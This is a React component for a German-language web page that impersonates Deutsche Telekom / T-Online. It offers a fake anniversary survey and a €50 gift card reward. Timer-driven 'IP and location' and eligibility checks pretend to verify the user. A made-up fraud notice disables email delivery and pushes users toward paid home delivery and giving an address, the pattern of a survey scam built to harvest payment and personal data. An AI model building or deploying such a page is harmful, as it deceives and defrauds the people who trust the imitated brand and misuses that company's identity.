import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Star, ChevronLeft, ChevronRight } from 'lucide-react';

const Survey = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(1);
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(1);
  const [showRewards, setShowRewards] = useState(false);
  const [selectedBrand, setSelectedBrand] = useState('otto');
  const [selectedDelivery, setSelectedDelivery] = useState('');
  const [showEmailError, setShowEmailError] = useState(false);
  const [selectedAddress, setSelectedAddress] = useState('');
  const [rewardStep, setRewardStep] = useState(1);

  const totalSteps = 9;

  const questions = [
    {
      id: 'satisfaction',
      title: 'Wie zufrieden sind Sie mit Ihrer aktuellen T-Online-Erfahrung?',
      subtitle: '(1 = Sehr unzufrieden, 5 = Sehr zufrieden)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'price-performance',
      title: 'Wie bewerten Sie das Preis-Leistungs-Verhältnis Ihres T-Online-Dienstes?',
      subtitle: '(1 = Sehr schlecht, 5 = Hervorragend)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'recommendation',
      title: 'Wie wahrscheinlich ist es, dass Sie T-Online einem Freund oder Kollegen empfehlen?',
      subtitle: '(1 = Überhaupt nicht wahrscheinlich, 5 = Sehr wahrscheinlich)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'customer-service',
      title: 'Wie empfinden Sie unseren Kundenservice?',
      subtitle: '(1 = Sehr schlecht, 5 = Hervorragend)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'connection-reliability',
      title: 'Wie empfinden Sie die Zuverlässigkeit Ihrer T-Online-Verbindung (Internet/Mobilfunk)?',
      subtitle: '(1 = Sehr schlecht, 5 = Sehr zuverlässig)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'expectations',
      title: 'Was erwarten Sie am meisten von Ihrem Telekommunikationsanbieter?',
      subtitle: '',
      type: 'radio',
      options: [
        'Schnelles Internet',
        'Hilfreicher Kundensupport',
        'Erschwingliche Preise',
        'Neue Technologien & Innovation',
        'Treuepramien'
      ]
    },
    {
      id: 'rewards',
      title: 'Welche Art von Belohnung würden Sie am meisten genießen?',
      subtitle: '',
      type: 'radio',
      options: [
        'Kostenlose Daten oder zusätzliche Monate',
        'Rabatt auf ein neues Handy/Gerät',
        'Online-Shop-Gutschein (z. B. Bol.com)',
        'Exklusiver Zugang zum Testpanel',
        'Spende an einen guten Zweck in meinem Namen'
      ]
    },
    {
      id: 'communication',
      title: 'Wie möchten Sie am liebsten über neue Angebote oder Updates informiert werden?',
      subtitle: '',
      type: 'radio',
      options: [
        'E-Mail',
        'SMS',
        'In der App',
        'Soziale Medien',
        'Ich möchte keine Werbung erhalten'
      ]
    },
    {
      id: 'overall-experience',
      title: 'Wie würden Sie Ihre gesamte Erfahrung mit T-Online bewerten?',
      subtitle: '(1 = Sehr schlecht, 5 = Ausgezeichnet)',
      type: 'star-rating',
      options: []
    }
  ];

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (isProcessing) {
      const steps = [
        { delay: 1000, step: 1 },
        { delay: 3000, step: 2 },
        { delay: 5000, step: 3 },
        { delay: 7000, step: 4 }
      ];

      steps.forEach(({ delay, step }) => {
        setTimeout(() => {
          if (step === 4) {
            setIsProcessing(false);
            setShowRewards(true);
          } else {
            setProcessingStep(step);
          }
        }, delay);
      });
    }
  }, [isProcessing]);

  const handleStarRating = (questionId: string, rating: number) => {
    setAnswers(prev => ({ ...prev, [questionId]: rating.toString() }));
  };

  const handleRadioChange = (questionId: string, value: string) => {
    setAnswers(prev => ({ ...prev, [questionId]: value }));
  };

  const handleNext = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
    }
  };

  const handleSubmit = () => {
    console.log('Survey completed:', answers);
    setIsProcessing(true);
    setProcessingStep(1);
  };

  const renderStarRating = (questionId: string) => {
    const currentRating = parseInt(answers[questionId] || '0');
    
    return (
      <div className="flex justify-center items-center space-x-2 my-8">
        {[1, 2, 3, 4, 5].map((star) => (
          <button
            key={star}
            onClick={() => handleStarRating(questionId, star)}
            className="transition-colors duration-200"
          >
            <Star
              className={`w-8 h-8 ${
                star <= currentRating
                  ? 'fill-pink-600 text-pink-600'
                  : 'fill-gray-200 text-gray-200'
              }`}
            />
          </button>
        ))}
      </div>
    );
  };

  const renderRadioOptions = (questionId: string, options: string[]) => {
    return (
      <RadioGroup
        value={answers[questionId] || ''}
        onValueChange={(value) => handleRadioChange(questionId, value)}
        className="space-y-4 my-8"
      >
        {options.map((option, index) => (
          <div key={index} className="flex items-center space-x-3">
            <RadioGroupItem value={option} id={`${questionId}-${index}`} />
            <Label htmlFor={`${questionId}-${index}`} className="text-gray-700 cursor-pointer">
              {option}
            </Label>
          </div>
        ))}
      </RadioGroup>
    );
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: '#8B7B8B' }}>
        <div className="flex flex-col items-center space-y-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
          <p className="text-white font-medium">Umfrage wird geladen...</p>
        </div>
      </div>
    );
  }

  const currentQuestion = questions[currentStep - 1];

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#f5f5f5' }}>
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="bg-pink-600 text-white px-4 py-2 text-sm">
          <div className="max-w-7xl mx-auto flex justify-between items-center">
            <div className="flex space-x-6">
              <span>Privatkunden</span>
              <span className="text-pink-200">Geschäftskunden</span>
            </div>
            <div className="flex space-x-6">
              <span>Telekom Shops</span>
              <span>Kontakt</span>
            </div>
          </div>
        </div>
        
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-8">
              <div className="w-12 h-12 bg-pink-600 rounded flex items-center justify-center">
                <span className="text-white font-bold text-xl">T</span>
              </div>
              <nav className="flex space-x-6">
                <span className="text-pink-600 font-medium">30 Jahre | Aktionen</span>
                <span className="text-gray-600">Mobilfunk</span>
                <span className="text-gray-600">Internet</span>
                <span className="text-gray-600">TV</span>
                <span className="text-gray-600">MeinMagenta App</span>
                <span className="text-gray-600">Glasfaser</span>
                <span className="text-gray-600">Service</span>
              </nav>
            </div>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="max-w-7xl mx-auto px-4 py-2">
        <div className="text-sm text-gray-500">
          Telekom › Unterwegs › <span className="text-pink-600">Aktionen</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Processing Screen */}
        {isProcessing && (
          <div className="bg-white rounded-lg shadow-lg overflow-hidden p-8">
            <div className="text-center">
              <h2 className="text-xl font-bold text-gray-800 mb-4">Umfrage wird verarbeitet</h2>
              <p className="text-gray-600 mb-8">Bitte warten Sie, während wir Ihre Eingabe verarbeiten</p>
              
              <div className="space-y-6 max-w-md mx-auto">
                {/* IP & Location Check */}
                <div className="flex items-center space-x-4">
                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                    processingStep >= 1 ? 'bg-green-500' : 'bg-gray-300'
                  }`}>
                    {processingStep >= 1 && (
                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    )}
                  </div>
                  <div className="text-left">
                    <p className={`font-medium ${processingStep >= 1 ? 'text-green-600' : 'text-gray-500'}`}>
                      IP & Standort überprüfen
                    </p>
                    <p className={`text-sm ${processingStep >= 1 ? 'text-green-500' : 'text-gray-400'}`}>
                      {processingStep >= 1 ? 'Überprüfung Ihres geografischen Standorts...' : 'Überprüfung Ihres geografischen Standorts...'}
                    </p>
                  </div>
                </div>

                {/* Save Answers */}
                <div className="flex items-center space-x-4">
                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                    processingStep >= 2 ? 'bg-green-500' : processingStep === 1 ? 'bg-pink-500' : 'bg-gray-300'
                  }`}>
                    {processingStep >= 2 ? (
                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    ) : processingStep === 1 ? (
                      <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                    ) : null}
                  </div>
                  <div className="text-left">
                    <p className={`font-medium ${
                      processingStep >= 2 ? 'text-green-600' : processingStep === 1 ? 'text-pink-600' : 'text-gray-500'
                    }`}>
                      Antworten speichern
                    </p>
                    <p className={`text-sm ${
                      processingStep >= 2 ? 'text-green-500' : processingStep === 1 ? 'text-pink-500' : 'text-gray-400'
                    }`}>
                      {processingStep >= 2 ? 'Ihre Antworten werden sicher gespeichert...' : 'Ihre Antworten werden sicher gespeichert...'}
                    </p>
                  </div>
                </div>

                {/* Check Eligibility */}
                <div className="flex items-center space-x-4">
                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                    processingStep >= 3 ? 'bg-green-500' : processingStep === 2 ? 'bg-pink-500' : 'bg-gray-300'
                  }`}>
                    {processingStep >= 3 ? (
                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    ) : processingStep === 2 ? (
                      <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                    ) : null}
                  </div>
                  <div className="text-left">
                    <p className={`font-medium ${
                      processingStep >= 3 ? 'text-green-600' : processingStep === 2 ? 'text-pink-600' : 'text-gray-500'
                    }`}>
                      Berechtigung prüfen
                    </p>
                    <p className={`text-sm ${
                      processingStep >= 3 ? 'text-green-500' : processingStep === 2 ? 'text-pink-500' : 'text-gray-400'
                    }`}>
                      {processingStep >= 3 ? 'Überprüfung der Umfragevoraussetzungen...' : 'Überprüfung der Umfragevoraussetzungen...'}
                    </p>
                  </div>
                </div>
              </div>

              {/* Progress Bar */}
              <div className="mt-8">
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div 
                    className="bg-pink-600 h-2 rounded-full transition-all duration-1000"
                    style={{ width: `${(processingStep / 3) * 100}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Rewards Selection Screen */}
        {showRewards && (() => {
          const brands = {
            otto: { name: 'OTTO', website: 'Otto.de', color: 'bg-red-600', textColor: 'text-red-600' },
            hm: { name: 'H&M', website: 'H&M', color: 'bg-black', textColor: 'text-black' },
            amazon: { name: 'amazon.de', website: 'Amazon', color: 'bg-orange-500', textColor: 'text-black' },
            douglas: { name: 'DOUGLAS', website: 'Douglas.de', color: 'bg-black', textColor: 'text-black' },
            telekom: { name: 'T', website: 'Telekom', color: 'bg-pink-600', textColor: 'text-pink-600' },
            zalando: { name: '🧡 zalando', website: 'Zalando.de', color: 'bg-orange-500', textColor: 'text-orange-500' }
          };

          const currentBrand = brands[selectedBrand] || brands.otto;

          const handleBrandSelect = (brand: string) => {
            setSelectedBrand(brand);
            setRewardStep(1);
          };

          const handleEmailClick = () => {
            setSelectedDelivery('');
            setSelectedAddress('');
            setShowEmailError(true);
            setRewardStep(1);
          };

          const handleHomeSelect = () => {
            setSelectedDelivery('home');
            setShowEmailError(false);
            setRewardStep(2);
          };

          const handleAddressSelect = (addressType: string) => {
            setSelectedAddress(addressType);
            setRewardStep(3);
          };

          return (
            <div className="bg-white rounded-lg shadow-lg overflow-hidden">
              {/* Step Indicators */}
              <div className="bg-gray-50 px-8 py-6">
                <div className="flex justify-center space-x-8">
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                      1
                    </div>
                    <span className={`${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Marke wählen</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                      2
                    </div>
                    <span className={`${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Lieferoption wählen</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm`}>
                      3
                    </div>
                    <span className={`${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Auswahl bestätigen</span>
                  </div>
                </div>
              </div>

              <div className="p-8">
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                  {/* Brand Selection */}
                  <div>
                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Marke auswählen</h3>
                    <div className="grid grid-cols-2 gap-4 mb-6">
                      {[
                        { name: 'Otto.de', brand: 'otto' },
                        { name: 'H&M', brand: 'hm' },
                        { name: 'Amazon', brand: 'amazon' },
                        { name: 'Douglas.de', brand: 'douglas' },
                        { name: 'Telekom', brand: 'telekom' },
                        { name: 'Zalando.de', brand: 'zalando' }
                      ].map((item) => (
                        <button
                          key={item.brand}
                          onClick={() => handleBrandSelect(item.brand)}
                          className={`p-4 border-2 rounded-lg transition-all ${
                            selectedBrand === item.brand
                              ? 'border-pink-600 bg-pink-50'
                              : 'border-gray-300 hover:border-pink-300'
                          }`}
                        >
                          <div className="text-center">
                            {item.brand === 'otto' && (
                              <div className="text-red-600 font-bold text-xl">OTTO</div>
                            )}
                            {item.brand === 'amazon' && (
                              <div className="font-bold text-xl">amazon.de</div>
                            )}
                            {item.brand === 'hm' && (
                              <div className="font-bold text-xl">H&M</div>
                            )}
                            {item.brand === 'douglas' && (
                              <div className="font-bold text-xl">DOUGLAS</div>
                            )}
                            {item.brand === 'telekom' && (
                              <div className="text-pink-600 font-bold text-xl">T</div>
                            )}
                            {item.brand === 'zalando' && (
                              <div className="text-orange-500 font-bold text-xl">🧡 zalando</div>
                            )}
                            <div className="text-sm text-gray-600 mt-2">{item.name}</div>
                          </div>
                        </button>
                      ))}
                    </div>

                    {/* Dynamic Gift Card */}
                    <div className={`${currentBrand.color} text-white p-6 rounded-lg`}>
                      <div className="flex justify-between items-center">
                        <div>
                          <div className="text-white font-bold text-lg mb-1">
                            {selectedBrand === 'telekom' ? 'T' : currentBrand.name}
                          </div>
                          <div className="text-sm">{currentBrand.website}</div>
                          <div className="text-xs mt-2">30 Jahre Deutsche Telekom<br />Gültig auf {currentBrand.website.toLowerCase()}</div>
                        </div>
                        <div className="text-right">
                          <div className="text-white text-sm">Geschenkkarte</div>
                          <div className="text-white font-bold text-3xl">50€</div>
                        </div>
                      </div>
                    </div>

                    <h3 className="text-lg font-semibold text-pink-600 mt-4 mb-2">{currentBrand.website} Geschenkkarte - 50€</h3>
                    <p className="text-sm text-gray-600 mb-4">
                      30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten! Nutzen Sie 
                      diese Geschenkkarte für {selectedBrand === 'otto' ? 'Mode, Möbel und mehr' : 'Millionen von Artikeln'} auf {currentBrand.website.toLowerCase()}. Nur im Juni verfügbar.
                    </p>
                    
                    <ul className="text-sm text-gray-600 space-y-1">
                      <li>• Wert: 50€</li>
                      <li>• Gültig für 1 Jahr ab Kaufdatum</li>
                      <li>• Kann für alle Produkte auf {currentBrand.website.toLowerCase()} verwendet werden</li>
                    </ul>
                  </div>

                  {/* Delivery Options */}
                  <div>
                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Lieferoption wählen</h3>
                    
                    {/* Warning Box - Only show when E-Mail is clicked */}
                    {showEmailError && (
                      <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                        <div className="flex items-start space-x-3">
                          <div className="w-4 h-4 border-2 border-red-500 rounded-full flex-shrink-0 mt-0.5"></div>
                          <div className="text-sm text-red-700">
                            Aufgrund von Betrügs- und Missbrauchsfällen ist ein Abgleich der Vertrags- mit der 
                            Lieferadresse erforderlich. Deshalb wurde der Versand der Geschenkkarte per E-Mail 
                            deaktiviert. Vielen Dank für Ihr Verständnis.
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Email Option (Clickable but shows error) */}
                    <button 
                      onClick={handleEmailClick}
                      className="w-full border border-gray-300 rounded-lg p-4 mb-4 hover:border-red-300 transition-colors"
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                          <div className="w-5 h-5 border-2 border-gray-400 rounded-full"></div>
                          <div className="text-left">
                            <div className="font-semibold text-gray-800">📧 E-Mail-Versand</div>
                            <div className="text-sm text-gray-600">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
                          </div>
                        </div>
                        <div className="text-green-600 font-semibold">Kostenlos</div>
                      </div>
                    </button>

                    {/* Home Delivery Option */}
                    <button 
                      onClick={handleHomeSelect}
                      className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
                        selectedDelivery === 'home' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                          <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
                            selectedDelivery === 'home' ? 'bg-pink-600' : ''
                          } flex items-center justify-center`}>
                            {selectedDelivery === 'home' && <div className="w-2 h-2 bg-white rounded-full"></div>}
                          </div>
                          <div className="text-left">
                            <div className="font-semibold text-gray-800">🏠 Heimversand</div>
                            <div className="text-sm text-gray-600">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
                          </div>
                        </div>
                        <div className="font-semibold">+1.95€</div>
                      </div>
                    </button>

                    {selectedDelivery === 'home' && (
                      <>
                        <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>

                        {/* Info Box */}
                        <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
                          <div className="flex items-start space-x-2">
                            <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
                            <div className="text-sm text-blue-700">
                              Wir senden Ihnen eine E-Mail mit den Versandinformationen und den Details Ihrer 
                              Bestellung, sobald Ihre Adresse erfolgreich überprüft wurde und Sie zur Lieferung 
                              berechtigt sind.
                            </div>
                          </div>
                        </div>

                        {/* Address Selection - Clickable buttons */}
                        <button
                          onClick={() => handleAddressSelect('meine')}
                          className={`w-full border-2 rounded-lg p-4 mb-4 transition-colors ${
                            selectedAddress === 'meine' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
                          }`}
                        >
                          <div className="flex items-center space-x-3">
                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
                              selectedAddress === 'meine' ? 'bg-pink-600' : ''
                            } flex items-center justify-center`}>
                              {selectedAddress === 'meine' && <div className="w-2 h-2 bg-white rounded-full"></div>}
                            </div>
                            <div className="text-left">
                              <div className="font-semibold text-gray-800">👤 Meine Adresse</div>
                              <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
                            </div>
                          </div>
                        </button>

                        <button
                          onClick={() => handleAddressSelect('andere')}
                          className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
                            selectedAddress === 'andere' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
                          }`}
                        >
                          <div className="flex items-center space-x-3">
                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
                              selectedAddress === 'andere' ? 'bg-pink-600' : ''
                            } flex items-center justify-center`}>
                              {selectedAddress === 'andere' && <div className="w-2 h-2 bg-white rounded-full"></div>}
                            </div>
                            <div className="text-left">
                              <div className="font-semibold text-gray-800">👥 Adresse einer anderen Person</div>
                              <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                            </div>
                          </div>
                        </button>

                        {/* Continue Button - Show when address is selected */}
                        {selectedAddress && (
                          <Button className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors">
                            Weiter
                          </Button>
                        )}

                        <p className="text-xs text-gray-500 mt-4">
                          Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
                          ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
                        </p>
                      </>
                    )}

                    {selectedDelivery !== 'home' && (
                      <Button 
                        className="w-full mt-6 bg-gray-300 text-gray-600 cursor-not-allowed"
                        disabled
                      >
                        Weiter
                      </Button>
                    )}
                  </div>
                </div>
              </div>
            </div>
          );
        })()}

        {/* Original Survey Content */}
        {!isProcessing && !showRewards && (
          <div className="bg-white rounded-lg shadow-lg overflow-hidden">
            {/* Survey Header */}
            <div className="text-center py-8 px-6">
              <div className="flex items-center justify-center mb-4">
                <span className="text-4xl mr-2">🎉</span>
                <h1 className="text-2xl font-bold text-gray-800">
                  T-Online – 30 Jahre Gemeinsam!
                </h1>
              </div>
              <p className="text-pink-600 font-medium">
                Füllen Sie diese kurze Umfrage aus und sichern Sie sich Ihre exklusive Jubiläumsbelohnung!
              </p>
              
              {/* Progress Bar */}
              <div className="mt-6">
                <div className="flex items-center justify-center mb-2">
                  <span className="text-sm text-gray-500">Ihre Vorlieben & Ihr Feedback</span>
                  <span className="ml-auto text-sm text-gray-500">{currentStep} / {totalSteps}</span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2 mb-6">
                  <div 
                    className="bg-pink-600 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${(currentStep / totalSteps) * 100}%` }}
                  ></div>
                </div>
              </div>
            </div>

            {/* Question Content */}
            <div className="px-8 pb-8">
              <div className="mb-8">
                <h2 className="text-lg font-semibold text-gray-800 mb-2">
                  {currentQuestion?.title} <span className="text-red-500">*</span>
                </h2>
                {currentQuestion?.subtitle && (
                  <p className="text-sm text-gray-500">{currentQuestion.subtitle}</p>
                )}
              </div>

              {/* Question Input */}
              {currentQuestion?.type === 'star-rating' && renderStarRating(currentQuestion.id)}
              {currentQuestion?.type === 'radio' && renderRadioOptions(currentQuestion.id, currentQuestion.options)}

              {/* Star Rating Text */}
              {currentQuestion?.type === 'star-rating' && answers[currentQuestion.id] && (
                <div className="text-center text-sm text-gray-500 mb-6">
                  {answers[currentQuestion.id]} von 5 Sternen
                </div>
              )}

              {/* Navigation Buttons */}
              <div className="flex justify-between items-center pt-6">
                <Button
                  variant="ghost"
                  onClick={handleBack}
                  disabled={currentStep === 1}
                  className="flex items-center space-x-2"
                >
                  <ChevronLeft className="w-4 h-4" />
                  <span>Zurück</span>
                </Button>

                {currentStep === totalSteps ? (
                  <Button
                    onClick={handleSubmit}
                    className="flex items-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6"
                    disabled={!answers[currentQuestion?.id]}
                  >
                    <span>Umfrage absenden</span>
                  </Button>
                ) : (
                  <Button
                    onClick={handleNext}
                    className="flex items-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6"
                    disabled={!answers[currentQuestion?.id]}
                  >
                    <span>Weiter</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 text-white py-12 mt-16">
        <div className="max-w-7xl mx-auto px-4">
          <div className="mb-8">
            <h2 className="text-2xl font-bold mb-4">
              Feiern Sie mit: 30 Jahre Telekom mit exklusiven Jubiläumsaktionen
            </h2>
            <p className="text-gray-300 mb-6">
              Zu unserem besonderen Jubiläum gibt es etwas nur für Sie: exklusive Belohnungen und Überraschungen! Durch die Teilnahme an unserer Jubiläumsumfrage haben Sie die Chance, spannende Vorteile zu sichern.
            </p>
            <p className="text-gray-300 mb-6">
              Von Geschenkarten über spezielle Angebote und Bonus-Rabatte bis hin zu weiteren zeitlich begrenzten Prämien – hier ist für jeden etwas dabei. Die Verfügbarkeit kann variieren, daher lohnt es sich, schnell mitzumachen, um die besten Vorteile zu erhalten.
            </p>
            <p className="text-gray-300">
              Ob Einkaufsgutscheine, Technik-Gadgets oder einzigartige Jubiläums-Deals – dies ist Ihre Gelegenheit, belohnt zu werden. Klare Bedingungen und eine einfache Teilnahme sorgen dafür, dass Sie sofort erkennen, welche Vorteile Sie erwarten.
            </p>
            <p className="text-gray-300 mt-4">
              <strong>Verpassen Sie nichts – nehmen Sie jetzt an der Umfrage teil und entdecken Sie, welche Belohnungen auf Sie warten!</strong>
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Survey;